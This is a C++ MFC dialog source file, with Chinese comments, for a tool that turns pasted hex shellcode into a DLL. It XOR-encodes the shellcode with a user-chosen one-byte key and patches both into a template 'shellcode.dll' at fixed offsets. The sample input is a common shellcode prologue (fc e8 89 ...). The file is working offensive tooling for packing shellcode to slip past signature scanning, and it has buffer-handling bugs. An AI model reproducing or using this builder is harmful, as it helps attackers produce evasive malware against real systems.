
// output_dllDlg.cpp: 实现文件
//

#include "pch.h"
#include "framework.h"
#include "output_dll.h"
#include "output_dllDlg.h"
#include "afxdialogex.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#endif
#include <cstdint>


// CoutputdllDlg 对话框



CoutputdllDlg::CoutputdllDlg(CWnd* pParent /*=nullptr*/)
	: CDialogEx(IDD_OUTPUT_DLL_DIALOG, pParent)
	, init_text1(_T(""))
	, init_text2(_T(""))
{
	init_text1 = "格式说明:\r\n输入HEX数组 fc e8 89 00 00 00 60 \r\n方法：原始 \\xfc\\xe8\\x89\\x00\\x00\\x00\\x60 \r\n      ：操作 \\x替换为空格\r\n      ：结果 fc e8 89 00 00 00 60";
	init_text2 = "建议16~255";
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
}

void CoutputdllDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	//  DDX_Control(pDX, IDC_EDIT1, m_edit1);
	//  DDX_Control(pDX, IDC_EDIT2, m_edit2);
	//  DDX_Text(pDX, IDC_EDIT1, m_edit1);
	//  DDX_Text(pDX, IDC_EDIT1, m_edit1);
	DDX_Control(pDX, IDC_EDIT1, m_edit1);
	DDX_Control(pDX, IDC_EDIT2, m_edit2);
	DDX_Text(pDX, IDC_EDIT1, init_text1);
	DDX_Text(pDX, IDC_EDIT2, init_text2);
}

BEGIN_MESSAGE_MAP(CoutputdllDlg, CDialogEx)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_BN_CLICKED(IDOK, &CoutputdllDlg::OnBnClickedOk)
END_MESSAGE_MAP()


// CoutputdllDlg 消息处理程序

BOOL CoutputdllDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	// 设置此对话框的图标。  当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	// TODO: 在此添加额外的初始化代码

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。  对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CoutputdllDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialogEx::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CoutputdllDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

BOOL CoutputdllDlg::ReleaseRes(CString strFileName, WORD wResID, CString strFileType)
{
	DWORD   dwWrite = 0;
	HANDLE  hFile = CreateFile(strFileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL,
		CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return FALSE;
	}

	// 查找资源文件中、加载资源到内存、得到资源大小    
	HRSRC   hrsc = FindResource(NULL, MAKEINTRESOURCE(wResID), strFileType);
	HGLOBAL hG = LoadResource(NULL, hrsc);
	DWORD   dwSize = SizeofResource(NULL, hrsc);

	// 写入文件    
	WriteFile(hFile, hG, dwSize, &dwWrite, NULL);
	CloseHandle(hFile);
	return TRUE;
}

unsigned int strlen(const char* str)
{
	const char* cp = str;
	while (*cp++);
	return (cp - str - 1);
}
//十六进制转字符
int hex2char(uint8_t c)
{
	return ((c >= '0') && (c <= '9')) ? int(c - '0') :
		((c >= 'A') && (c <= 'F')) ? int(c - 'A' + 10) :
		((c >= 'a') && (c <= 'f')) ? int(c - 'a' + 10) :
		-1;
}
//十六进制转字符串
int Hex2Ascii(char* hex, char* ascii)
{
	int hexLen = strlen(hex);
	int asciiLen = 0;

	for (int i = 0, cnt = 0; i < hexLen; i++)
	{
		char c = hex2char(hex[i]);

		if (-1 == c)
			continue;
		if (cnt) {
			cnt = 0;
			ascii[asciiLen++] += c;
		}
		else {
			cnt = 1;
			ascii[asciiLen] = c << 4;
		}
	}
	ascii[asciiLen++] = 0;
	return asciiLen;
}


void CoutputdllDlg::OnBnClickedOk()
{
	//获取shellcode
	CString m_SRC;///-///源字符串
	m_edit1.GetWindowText(m_SRC);
	char buf[1500];
	char* p = (LPSTR)(LPCTSTR)m_SRC;
	Hex2Ascii(p, buf);

	//获取key
	CString m_key;///-///源字符串
	int num;
	m_edit2.GetWindowText(m_key);
	num = atoi(m_key);
	if (num > 15 && num < 256)
	{
		//异或
		for (int c = 0; c < sizeof(buf); c++)
		{
			buf[c] = buf[c] ^ num;
		}

		if (ReleaseRes("shellcode.dll", IDR_DLL1, "DLL"))
		{
			HMODULE hCurrentModule = GetModuleHandle(NULL);
			HRSRC	hRes = FindResource(hCurrentModule, MAKEINTRESOURCE(IDR_DLL1), "DLL");
			HGLOBAL hGlobal = LoadResource(hCurrentModule, hRes);
			DWORD	nLen = SizeofResource(hCurrentModule, hRes);
			LPBYTE	p = (LPBYTE)LockResource(hGlobal);

			CFile	f;
			f.Open("shellcode.dll", CFile::modeCreate | CFile::modeWrite);
			f.Write(p, nLen);
			f.Seek(0x001E18, CFile::begin);
			f.Write(buf, sizeof(buf) + 1);
			f.Seek(0x001500, CFile::begin);
			char key[2];
			char key_hex[2];
			sprintf(key_hex, "%x", num);
			char* b = (LPSTR)(LPCTSTR)key_hex;
			Hex2Ascii(b, key);
			for (int i = 0; i < 16; i++)
			{
				f.Write(key, sizeof(key) - 1);
			}
			f.Close();
			UnlockResource(hGlobal);
			MessageBox("生成成功", "提示", MB_OK);
		}
		else
		{
			MessageBox("发生错误", "提示", MB_OK);
		}
	}
	else
	{
		MessageBox("KEY需要在16~255", "提示", MB_OK);
	}
	
	
}


